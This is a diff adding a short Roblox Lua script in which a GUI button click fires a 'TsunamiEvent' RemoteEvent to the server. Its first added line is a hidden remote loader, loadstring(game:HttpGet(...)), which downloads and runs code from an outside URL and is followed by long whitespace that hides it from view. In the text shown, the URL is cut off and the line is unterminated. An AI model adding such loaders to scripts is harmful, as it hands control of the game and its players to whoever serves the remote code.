@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https:                                                                          
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TsunamiEvent = ReplicatedStorage:WaitForChild("TsunamiEvent")
+script.Parent.MouseButton1Click:Connect(function()
+    TsunamiEvent:FireServer()
+end)
